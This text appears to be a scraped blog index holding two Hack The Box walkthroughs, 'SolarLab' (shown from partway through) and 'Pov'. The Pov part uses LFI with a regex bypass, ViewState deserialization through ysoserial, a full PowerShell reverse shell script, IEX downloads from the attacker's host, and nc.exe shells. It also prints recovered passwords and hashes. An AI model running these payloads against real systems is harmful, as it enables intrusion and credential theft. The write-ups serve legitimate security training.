CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(2 55),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME)) ... INSERT INTO OFUSER VALUES(&#39;admin&#39;,&#39;gjMoswpK+HakPdvLIvp6eLKlYh0=&#39;,&#39;9MwNQcJ9bF4YeyZDdns5gvXp620=&#39;,&#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#39;,4096,NULL,&#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#39;,&#39;Administrator&#39;,&#39;admin@solarlab.htb&#39;,&#39;001700223740785&#39;,&#39;0&#39;) ... INSERT INTO OFPROPERTY VALUES(&#39;passwordKey&#39;,&#39;hGXiFzsKaAeYLjn&#39;,0,NULL) USERNAME: admin STOREDKEY: gjMoswpK+HakPdvLIvp6eLKlYh0= SERVERKEY: 9MwNQcJ9bF4YeyZDdns5gvXp620= SALT: yidQk5Skw11QJWTBAloAb28lYHftqa0x ITERATIONS: 4096 PLAINPASSWORD: NULL ENCRYPTEDPASSWORD: becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442
In the neighboring conf directory, there is a file security.xml that identifies this has as blowfish.
Openfire admin hash I might be able to figure out how to construct that into a blowfish hash, but when I was searching how to do that, I came across a purpose-built tool that claims to decrypt an Openfire hash automatically. The tool itself is very poorly documented, but there are some details in a thread of the hashcat forums:
In short, we need to provide the encrypted password and the passwordKey.
git clone https://github.com/c0rdis/openfire_decrypt.git cd openfire_decrypt javac OpenFireDecryptPass.java ava OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn Very rapidly, it provided a result:
Cool, so we found the password for the admin user from Openfire: admin : ThisPasswordShouldDo!@. I&rsquo;ll check if there&rsquo;s anything else I can access on the dashboard that I havent seen yet. However, since I just found a new password, I should check everything else for credential re-use, just in case.
Credential reuse On this box, we already have the password for openfire, so I&rsquo;ll check if the new password works for either of the other two.
Since I&rsquo;m not sure if blake can access SMB, it&rsquo;s a better test to just try RunasCs.exe instead:
X:\\RunasCs.exe blake &#34;ThisPasswordShouldDo!@&#34; &#34;cmd /c whoami /all&#34; X:\\RunasCs.exe Administrator &#34;ThisPasswordShouldDo!@&#34; &#34;cmd /c whoami /all&#34; blake didn&rsquo;t work&hellip; but Administrator did!! &#x1f389; Let&rsquo;s turn this into a reverse shell!
Administrator shell I still have one of my reverse shell listeners sitting around, on port 4447. This is one that I created a reverse shell payload in msfvenom for but hadn&rsquo;t actually used it yet. Regardless, since I already have nc on the box, I&rsquo;ll use that instead.
sudo ufw allow from $RADDR to any port 4447 proto tcp rlwrap nc -lvnp 4447 With the listener established, we can use RunasCs.exe again to open a reverse shell:
.\\RunasCs.exe Administrator &#34;ThisPasswordShouldDo!@&#34; &#34;C:\\Users\\Public\\Downloads\\nc.exe 10.10.14.50 4447 -e cmd.exe&#34; -t 0 And there&rsquo;s our shell as solarlab\\administrator! The root flag is exactly where it normally is; type it of the final points of this box &#x1f4b0;
CLEANUP Target I&rsquo;ll get rid of the all of the executables that I transferred to the target:
cd C:\\Users\\Public\\Downloads del /q /s .\\* Other than that, I simple need to terminate my SMB share and everything becomes inaccessible.
Even then, since this is a personal instance, I can just terminate the whole instance &#x1f609;
Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space. On this box, I copied the whole C:\\Program Files\\Openfire directory:
cd loot cp Openfire/embedded-db/openfire.script . rm -rf Openfire The size of everything else I obtained is negligible.
It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; Other than that, I&rsquo;ll close my chisel tunnel and be done with it.
LESSONS LEARNED Attacker &#x23e9; Don&rsquo;t test HTTP(S) first. Web can be a very large attack surface. Also, web enumeration can be complicated and protracted. If you find other ports open that are running interesting things (SMB and FTP really come to mind) then you should test those first instead of HTTP.
&#x1f41d; Make small test-cases when you&rsquo;re trying to figure out if something will work. Don&rsquo;t rush ahead and try to deliver a whole fully-formed payload: test as incrementally as possible and you will find yourself accomplishing your goals much faster than you otherwise might.
&#x1f50d; &ldquo;Can I access the credentials?&rdquo; That should be the very first question when you gain access to the Program Files for an application or service. You can put yourself down a very deep rabbit-hole if you don&rsquo;t stop and think before diving into deeper questions like &ldquo;how can I exploit this service? What&rsquo;s hiding in there that I cant find?&rdquo;.
&#x1f46d; Always check credential reuse. Just do it. Every time. It&rsquo;s annoying because we all want to be super h4x0rz and pull off epic chains of exploits, but actually checking for credential reuse is way higher yield. It&rsquo;s easy and doesn&rsquo;t take much time, but could save you hours.
Defender &#x1f921; If you&rsquo;re keeping passwords and security question in a spreadsheet in plaintext, you need to take a hard look at yourself and how you got here.
&#x1f945; Use frontend and backend validation / sanitization hand-in-hand. Frontent validation and sanitization are important because they reduce the frequency of automated attacks, but in reality it&rsquo;s the backend that should be preventing a determined attacker. If possible, also add a WAF into the mix to ease the burden on your backend.
&#x26d4; Databases shouldn&rsquo;t store plaintext credentials. Actually, just don&rsquo;t store plaintext credentials anywhere.
&#x1f46e; Use an antivirus in Windows. If this target had an antivirus enabled, it would have been substantially harder to do many of the steps that I used. For every pivot between users, I was opening fresh shells. I also ran loud/noisy privesc enumeration tools. All of this, realistically, should have been thwarted by an AV.
`,url:"https://4wayhandshake.github.io/walkthrough/solarlab/"},"https://4wayhandshake.github.io/walkthrough/pov/":{title:"Pov",tags:["LFI","Insecure Deserialization","Secure String","Token Abuse","PID Migration"],categories:["Walkthrough","HTB","Windows","Medium"],content:`INTRODUCTION HTB released Pov during Season IV. I didn&rsquo;t play that season, so I&rsquo;m coming to it a few months after. I learned a lot from this box; it really helped me polish my skills for attacking Windows using a Linux box. The pathway to the root flag is very interesting, and requires a wide array of skills. Having just completed my walkthrough for Mailing, this box was refreshingly straightforward: there was no guesswork, and every step led quite logically into the next.
Foothold is all about using knowledge of ASP.NET to attack an insecure subdomain. One of the pages uses a mechanism that relies on insecure deserialization, where the security of this feature is broken by means of an LFI present on that same page. A little bit of web skill goes a long way on this one. The really cool part was learning how to use the popular tool ysoserial.exe against a Windows target, but using Linux to create the payload. This took a bit of work, but now I&rsquo;m confident I have the tooling to perform this same feat on future Windows boxes.
Gaining the user flag requires a pivot to a second user. While the credential is seemingly just sitting there, complications with the initial foothold&rsquo;s reverse shell make it difficult to utilize the credential. This part forced me to learn a bit about windows security and how administrators handle credentials. Defeating this step leads to a quick sprint to root.
The root flag will require a little bit of enumeration. By applying the right privesc scripts, you&rsquo;ll see the privesc vector right away. However, exploiting it is not so trivial. For me, a main challenge was giving up my pride and resorting to using metasploit. After that, privilege escalation was easy, but teaches a really valuable red-teaming skill &#x1f609;
Great box! Thank you, d00msl4yer &#x1f44d;
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 80/tcp open http Only HTTP? Yuck. That means I&rsquo;ll probably be working out of a reverse shell for a long time once I reach foothold.
Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: pov.htb Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (88%) Aggressive OS guesses: Microsoft Windows Server 2019 (88%) Server is running Microsoft IIS 10.0, and we&rsquo;ve confirmed pov.htb is a domain. Interestingly the server listens for TRACE requests
If I find myself wanting to obtain information from a request header, this TRACE operation might be useful - it could bypass protection normally afforded by an http-only cookie, for example.
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No results.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR No results.
Webserver Strategy Noting the redirect from the nmap scan, I added pov.htb to /etc/hosts and did banner grabbing on that domain:
export DOMAIN=pov.htb export URL=http://$DOMAIN echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $URL &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v -fs 0 No results from scanning for vhosts at the root level. Now I&rsquo;ll check for subdomains of pov.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v -fs 0 Ok, we&rsquo;ve found a subdomain: dev.pov.htb with a redirect to /portfolio. I&rsquo;ll move on to directory enumeration on http://pov.htb and we&rsquo;ll check out this subdomain afterwards:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 1 -c -o ffuf-directories-root -of json -e .php,.asp,.aspx,.js,.html -timeout 4 -v Directory enumeration against http://pov.htb/ gave the following:
Alright, the pov.htb domain is pretty standard. Nothing interesting going on there. Let&rsquo;s check out that subdomain now:
echo &#34;$RADDR dev.$DOMAIN&#34; | sudo tee -a /etc/hosts ffuf -w $WLIST:FUZZ -u http://dev.$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 1 -c -o ffuf-directories-dev -of json -e .php,.asp,.aspx,.js,.html -timeout 4 -v -fw 9 Hmm, it&rsquo;s unclear why these results are different from the other ones&hellip; Is it because they contain . characters, or extensions? Strange.
Exploring the Website This website claims to provide some kind of security solution for websites. I.e. the clients of this company are admins of other websites (and mail servers).
The index / landing page is generally uninteresting. The only important information I found was down at the bottom of the page, the text that appeared alongside the &ldquo;contact us&rdquo; form:
The description gives away a subdomain dev.pov.htb, but we already knew about that from the subdomain scan. Also, there is a hint at a username, sfitz.
They used the actual area code for Corpus Christi. Nice easter egg there. The address is fake though.
The dev.pov.htb subdomain shows a lot more information. Right away, I see a couple clues. First, the About section shows ASP.NET conspicuously bolded. We are definitely going to be using some ASP stuff on this target!
A little further down, we see in the Testimonials carousel a hint that&hellip; maybe Stephen isn&rsquo;t as good with ASP.NET as he thinks he is &#x1f605;
The button to download Stephen&rsquo;s CV seemed a little suspicious. Why have it set up like this?
To take a closer look, I hopped into ZAP and turned on the HUD. It pointed out right away that there are a bunch of hidden fields and comments, exposing the action of this download button:
Let&rsquo;s try clicking that Download CV button and proxy it through ZAP:
From the response we can see that the ASP.NET version is 4.0.30319. Also, we can see very clearly in the request that the file parameter is obtained from the frontend. Here&rsquo;s the frontend code behind how that works:
&lt;script type=&#34;text/javascript&#34;&gt; //&lt;![CDATA[ var theForm = document.forms[&#39;form1&#39;]; if (!theForm) { theForm = document.form1; } function __doPostBack(eventTarget, eventArgument) { if (!theForm.onsubmit || (theForm.onsubmit() != false)) { theForm.__EVENTTARGET.value = eventTarget; theForm.__EVENTARGUMENT.value = eventArgument; theForm.submit(); } } //]]&gt; &lt;/script&gt; I.e. the file is a form input but the EVENTTARGET and EVENTARGUMENT also get included in the form, but only when it&rsquo;s submitted.
I wonder if we can play around with this to obtain files via an LFI? First, I&rsquo;ll try getting a file that we know should be there - default.aspx:
That worked perfectly. See the reference to CodeFile at the top? Clearly, this default.aspx uses that C# file, so let&rsquo;s try obtaining index.aspx.cs using the same trick:
using System; using System.Collections.Generic; using System.Web; using System.Web.UI; using System.Web.UI.WebControls; using System.Text.RegularExpressions; using System.Text; using System.IO; using System.Net; public partial class index : System.Web.UI.Page { protected void Page_Load(object sender, EventArgs e) { } protected void Download(object sender, EventArgs e) { var filePath = file.Value; filePath = Regex.Replace(filePath, &#34;../&#34;, &#34;&#34;); Response.ContentType = &#34;application/octet-stream&#34;; Response.AppendHeader(&#34;Content-Disposition&#34;,&#34;attachment; filename=&#34; + filePath); Response.TransmitFile(filePath); Response.End(); } } Alright! We obtained the file, and now we know exactly how it&rsquo;s &ldquo;protecting&rdquo; against LFI for the download.aspx endpoint.
We can very easily bypass this &quot;../&quot; to &quot;&quot; replacement by doubling up on the traversal (ex. ....//). But also, it should be totally possible to just use an absolute filepath instead. Let&rsquo;s try the hosts file:
&#x1f4a1; Note that at least one of the EVENTTARGET, EVENTARGUMENT, VIEWSTATE, VIEWSTATEGENERATOR, or EVENTVALIDATION fields are acting as an anti-CSRF token.
As a result, we can&rsquo;t easily just blast the download endpoint with regular fuzzing techniques (like ffuf or ZAP fuzz). If we need to automate this, I could use any of the following:
Selenium Python requests piping cURL into cURL The point is that, fundamentally, every POST request will need to be preceded by a unique GET request.
Yep, that&rsquo;s the hosts file. So we can access the filesystem using this LFI. Also, we have confirmation that dev.pov.htb is probably the only subdomain.
&#x1f914; I wonder if we can also load an external file? In other words, is this also an RFI? I&rsquo;ll start up an http server and try it out. For this, I&rsquo;ll use one of my own tools: simple-http-server.
Feel free to just to PHP or http.server instead, but my tool has advantages for data exfiltration and easily examining headers.
sudo ufw allow from $RADDR to any port 8000 proto tcp simple-server 8000 -v Next, using the UI I&rsquo;ll request http://10.10.14.22:8000/index.html:
Huh? The path was interpretted very oddly. The response header shows the requested path:
Content-Disposition: attachment; filename=htt/10.10.14.22:80index.html &#x1f602; OH! I get it. I totally misinterpreted that regex that we saw in index.aspx.cs, and frankly I think Stephen did as well.​
The ../ was being interpreted not literally, but actually in the regex-style special-character way, as [any char][any char]/. In this way, every two characters before any slash, plus the slash itself, will be removed from the requested path!
The bolded characters were removed because they match the regex: http://10.10.14.22:80**00/**index.html
In other words, we can bypass this reading our string and replacing every / with XX//, like this: http:XX//XX//10.10.14.22:8000XX//index.html
Loading the external resource did not work, but learning how to bypass the regex might be useful nonetheless! It&rsquo;s still unclear how I&rsquo;ll eventually get RCE on the target though - there&rsquo;s no SSH, no WinRM&hellip; nothing but this webserver. I&rsquo;ll need to do some research and figure out how I might be able to use the LFI to gain RCE.
FOOTHOLD Viewstate I did some reading about ASP.NET webservers, and specifically about how to gain RCE on them. Remember those parameters being send in the POST to download.aspx, EVENTTARGET, EVENTARGUMENT, VIEWSTATE, VIEWSTATEGENERATOR, or EVENTVALIDATION? Well, it turns out one of those might be able to get us RCE: VIEWSTATE.
According to this Hacktricks page, it&rsquo;s possible to exploit some insecure deserialization in the VIEWSTATE variable. Apparently, the VIEWSTATE variable holds all of the internal state of a page, and is used when interacting with the ASP engine to carry out all user interaction with the server; the server renders according to the viewstate, etc. Long story short, it&rsquo;s a big base64 object that might be controllable, and ultimately is deserialized insecurely.
This is a known issue, so the server-side solution is to sign/verify the VIEWSTATE. The server uses a signing key on the state, upon every interaction the state is verified with a verification key. The keys for this mechanism are stored in a file called web.config. But obviously, that file is not publicly accessible&hellip; &#x1f60f;
That&rsquo;s where the LFI comes into play! Let&rsquo;s grab that web.config file and hope there are keys inside:
I first tried in the current directory, but there was no such file so I checked the parent directory instead.
&#x1f44d; Got it. Here are the contents:
&lt;configuration&gt; &lt;system.web&gt; &lt;customErrors mode=&#34;On&#34; defaultRedirect=&#34;default.aspx&#34; /&gt; &lt;httpRuntime targetFramework=&#34;4.5&#34; /&gt; &lt;machineKey decryption=&#34;AES&#34; decryptionKey=&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34; validation=&#34;SHA1&#34; validationKey=&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34; /&gt; &lt;/system.web&gt; &lt;system.webServer&gt; &lt;httpErrors&gt; &lt;remove statusCode=&#34;403&#34; subStatusCode=&#34;-1&#34; /&gt; &lt;error statusCode=&#34;403&#34; prefixLanguageFilePath=&#34;&#34; path=&#34;http://dev.pov.htb:8080/portfolio&#34; responseMode=&#34;Redirect&#34; /&gt; &lt;/httpErrors&gt; &lt;httpRedirect enabled=&#34;true&#34; destination=&#34;http://dev.pov.htb/portfolio&#34; exactDestination=&#34;false&#34; childOnly=&#34;true&#34; /&gt; &lt;/system.webServer&gt; &lt;/configuration&gt; Perfect! The two keys we needed, decryptionKey and validationKey, are both present. We also now know that it uses AES encryption and SHA1 validation.
Crafting the payload &#x26a0;&#xfe0f; This is not quite the way to do it, skip ahead to the bash script below to see how I eventually got it working!
DECRYPT_KEY=74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43 VALIDTN_KEY=5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468 PAYLOAD_CMD=&#34;powershell.exe Invoke-WebRequest -Uri http://10.10.14.22:8000/?msg=success&#34; GENERATOR=8E0F0FA3 DECRYPT_KEY and VALIDTN_KEY are from the web.config file that we obtained through the LFI. The PAYLOAD_CMD is just a base-64 encoded powershell reverse shell, from revshells.com. The GENERATOR is the value of the __VIEWSTATE_GENERATOR, that seems static and does not change between page loads (obtained according to the instructions on HackTricks).
As per the instructions, I&rsquo;ll use ysoserial.exe to generate the payload:
wine ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &#34;$PAYLOAD_CMD&#34; --path=&#34;/portfolio/default.aspx&#34; --generator &#34;$GENERATOR&#34; --decryptionalg=&#34;AES&#34; --decryptionkey=&#34;$DECRYPT_KEY&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;$VALIDTN_KEY&#34; 2&gt;/dev/null | tee ~/Box_Notes/Pov/exploit/ysoserial_payload.b64 ASIDE: YSOSERIAL.EXE ON LINUX You may be wondering &ldquo;hey, you&rsquo;re running kali. How is Ysoserial.exe actually working??&rdquo;. As you probably already know, wine is a way to run windows programs on linux. That part is easy. The really trick was actually getting dotnet installed, which is essential to Ysoserial&rsquo;s functionality.
For this, I followed this short guide by Hyperion, but I&rsquo;ll summarize the steps here (in case it&rsquo;s taken off Medium):
sudo apt update sudo apt install mono-complete wine winetricks -y # Make a directory for ysoserial somewhere # Download the latest release of Ysoserial.net (I&#39;m using v1.36) into that directory unzip ysoserial*.zip winetricks dotnet48 # Wait a long time. Lots of errors encountered. # Test your installation cd Release wine ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c &#34;ping 127.0.0.1&#34; Even when I ran the test ping payload, my ysoserial.exe spewed out a bunch of errors. Be sure to redirect stderr so that the error text doesn&rsquo;t get in the way of your payload.
I&rsquo;ll also need a way to verify whether or not it&rsquo;s working. For this, I&rsquo;ll use an http server again:
sudo ufw allow from $RADDR to any port 139,445,4444,8000 proto tcp simple-server 8000 -v &#x1f602; You can tell from all those ports that I&rsquo;m pretty hopeful this is going to work
From there, I swapped out the VIEWSTATE variable in the POST request from clicking the Download CV button:
I submitted that request&hellip; but didn&rsquo;t see any request come in to my http server &#x1f61e;
First successful payload After many, many iterations of making tiny adjustments to the way I was both generating and submitting the payload, I finally got it working! &#x1f389;
This is what I had been doing wrong:
The --generator option doesn&rsquo;t seem to work. You&rsquo;d think you need to include an --apppath instead (like Hacktricks says) but actually you can just completely omit it. Swapping out the VIEWSTATE by manipulating the DOM doesn&rsquo;t actually work. Instead, proxy the request into ZAP and swap out the VIEWSTATE, then forward the request. I&rsquo;m not sure why that&rsquo;s the case. Be sure to output stderr to /dev/null when running ysoserial.exe. If you don&rsquo;t do that, the errors that it spews out are appended directly to the end of the payload, with no space or line break - and the first few characters look like they&rsquo;d be part of the base64 data. Best to suppress stderr entirely. These changes culminated in the following script, ysoserial_make_payload.sh:
#!/bin/bash if [ $# -lt 1 ]; then echo &#34;Usage: $(basename &#34;$0&#34;) &lt;cmd&gt;&#34; echo &#34;Error: No command for the payload was provided.&#34; exit 1 fi DECRYPT_KEY=74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43 VALIDTN_KEY=5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468 PAYLOAD_CMD=$1 wine /your/path/to/ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &#34;$PAYLOAD_CMD&#34; --path=&#34;/portfolio/default.aspx&#34; --decryptionalg=&#34;AES&#34; --decryptionkey=&#34;$DECRYPT_KEY&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;$VALIDTN_KEY&#34; 2&gt;/dev/null | tee ~/Box_Notes/Pov/exploit/ysoserial_payload.b64 I ran my ysoserial_make_payload.sh to generate a GET request to my http server, to see if it was working:
./ysoserial_make_payload.sh &#34;powershell.exe Invoke-WebRequest -Uri http://10.10.14.22:8000/?msg=success&#34; &hellip;then proxied the Download CV request through ZAP&rsquo;s HUD:
&#x1f44f; After forwarding the request, I saw the target contact my http server:
Fantastic! Now let&rsquo;s adjust this process to open a reverse shell instead. I think the cleanest way is to use powershell to run a remote .ps1 script. I&rsquo;ll use the &ldquo;Powershell #1&rdquo; script from revshells.com, saved to reverseshell.ps1:
$LHOST = &#34;10.10.14.22&#34;; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2&gt;&amp;1 } catch { $_ }; $StreamWriter.Write(&#34;$Output\`n&#34;); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close() Now I&rsquo;ll just modify the GET request that I used before, to instead load the above script:
./ysoserial_make_payload.sh &#34;powershell.exe IEX (Invoke-WebRequest -Uri http://10.10.14.22:8000/reverseshell.ps1 -UseBasicParsing)&#34; Once again I proxied the Download CV request through ZAP, and oila I have a reverse shell!
USER FLAG Upgrading the shell This shell is absolutely terrible. I need to fix this or the rest of the box will be excrutiating.
Since I opened the SMB ports, I think the easiest way to upgrade is opening a new reverse shell, sending powershell through it:
sudo ufw allow from $RADDR to any port 4445 proto tcp cp ~/Tools/nc.exe . sudo impacket-smbserver -smb2support -username &#39;kali&#39; -password &#39;testtesttest&#39; share . # Then in another tab: rlwrap nc -lvnp 4445 Then, on the target I&rsquo;ll map the drive and copy over socat:
net use x: \\\\10.10.14.22\\share /user:kali testtesttest cd C:\\Users\\sfitz\\Downloads copy X:\\nc.exe .\\nc.exe 10.10.14.22 4445 -e powershell.exe Then we have a nice Powershell-based reverse shell with command history &#x1f44d;
Local enumeration: sfitz Now that I have a much nicer shell to use, I may as well start local enumeration. It might not work, but I&rsquo;ll try using WinPEAS:
copy X:\\winPEASany.exe .\\winPEASany.exe As usual, WinPEAS produces a huge amount of very useful info. First, it&rsquo;s good to get a sense of who else is on the box:
Oh interesting, alaading is in the Remote Management Users group, even though WinRM, RDP etc are not listening externally.
It looks like OpenSSH is installed, maybe we can connect that way?
OpenSSH Authentication Agent(OpenSSH Authentication Agent)[C:\\Windows\\System32\\OpenSSH\\ssh-agent.exe] The NTLMv2 hash is available:
sfitz::POV:1122334455667788:4da7ad8a8aecbd9a92d454167a92595a:0101000000000000b15340cb5ca2da01b11031e11a7121c300000000080030003000000000000000000000000020000087d80dc37468cb66e4ab5c53a826828a46878794b3c9de2bc841459642be4e2e0a00100000000000000000000000000000000000090000000000000000000000 Excellent. I&rsquo;ll come back and take another look at the WinPEAS result once I poke around the filesystem for a bit.
Thankfully, I didn&rsquo;t have to look very far: there is a very juicy-looking file in C:\\Users'sfitz\\Documents:
There&rsquo;s a credential for alaading sitting there in plaintext!
1000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6
Credential for alaading After trying to use that password in a few different ways, I decided to look up what this System.Management.Automation.PSCredential thing is.
As it turns out, the text above is not a password at all. Actually, it&rsquo;s more like a password hash (but reversible??). It&rsquo;s a format called a Powershell Secure String. It&rsquo;s a way for administrators to store passwords in files, but not have the plaintext password readable. It&rsquo;s fully reversible:
This process is from this article. Read it for more detail.
$username = &#34;alaading&#34; $securestring = ConvertTo-SecureString -String &#34;myplainTextP455word&#34; -AsPlainText -Force $credential = New-Object System.Management.Automation.PSCredential($username, $securestring) $credential.GetNetworkCredential() | fl However, I couldn&rsquo;t get the above process to work, because my reverse shell seems to die whenever I pass it too long of a string. Perhaps I&rsquo;ll need to parse the XML directly&hellip;
After quite a bit of wrestling with ChatGPT, I finally scrapped together a small powershell script to convert this Secure String to a plaintext password, extract_password_from_xml.ps1
# Load the XML file $credentialXml = [xml](Get-Content -Path &#34;C:\\Users\\sfitz\\Documents\\connection.xml&#34;) # Load the PSCredential object from the XML $credential = [System.Management.Automation.PSCredential]::new($credentialXml.Objs.Obj.Props.S.&#39;#text&#39;, (ConvertTo-SecureString $credentialXml.Objs.Obj.Props.SS.&#39;#text&#39;)) # Print the credential $credential.GetNetworkCredential() | fl Now we can run it as a remote script, using IEX:
IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.22:8000/extract_password_from_xml.ps1&#39;) And we recover the password &#x1f389;
We have a known powershell credential now, alaading : f8gQ8fynP44ek1m3
&#x1f605; Life is easy when there&rsquo;s no AV, eh?
Let&rsquo;s see where this credential can be used:
psexec did not work:
impacket-psexec -target-ip alaading:f8gQ8fynP44ek1m3@$RADDR powershell.exe crackmapexec didn&rsquo;t work in either smb or winrm mode:
crackmapexec smb -u &#39;alaading&#39; -p &#39;f8gQ8fynP44ek1m3&#39; -x &#34;cmd /c whoami&#34; $RADDR crackmapexec winrm -u &#39;alaading&#39; -p &#39;f8gQ8fynP44ek1m3&#39; -x &#34;cmd /c whoami&#34; $RADDR &#x1f914; Hmm&hellip; Actually, there is a good way to do this on windows. It&rsquo;s kinda like the equivalent of su from Linux: RunAs. I already have a more reliable version of that sittting around, RunasCs.exe, so let&rsquo;s give that a go instead. I&rsquo;m not really sure of the syntax&hellip;
X:\\RunasCs.exe --help That example looks perfect. Let&rsquo;s open another reverse shell, this time as alaading:
sudo ufw allow from $RADDR to any port 4446 proto tcp rlwrap nc -lvnp 4446 X:\\RunasCs.exe alaading f8gQ8fynP44ek1m3 &#34;.\\nc.exe 10.10.14.22 4446 -e powershell.exe&#34; -t 0 Huh? Access is denied? &#x1f615;
&#x1f926;&zwj;&#x2642;&#xfe0f; Ohh.. duh. I&rsquo;m trying to run nc.exe from C:\\Users\\Downloads\\sfitz, and alaading doesn&rsquo;t have access to that folder! Let&rsquo;s copy it to Public and try again.
cd C:\\Users\\Public\\Downloads copy X:\\nc.exe X:\\RunasCs.exe alaading f8gQ8fynP44ek1m3 &#34;.\\nc.exe 10.10.14.22 4446 -e powershell.exe&#34; -t 0 &#x1f601; It worked! We managed to open yet another reverse shell:
And there&rsquo;s the user flag. Fantastic! Just type it out for some points.
type user.txt ROOT FLAG Local enumeration: alaading I ran WinPEAS, and the results were almost overwhelming. To try to get a more thinned-down precise set of privesc vectors, I tried SharpUp. The source code is available on GhostPack&rsquo;s repo, but I&rsquo;m using the precompiled binary from here.
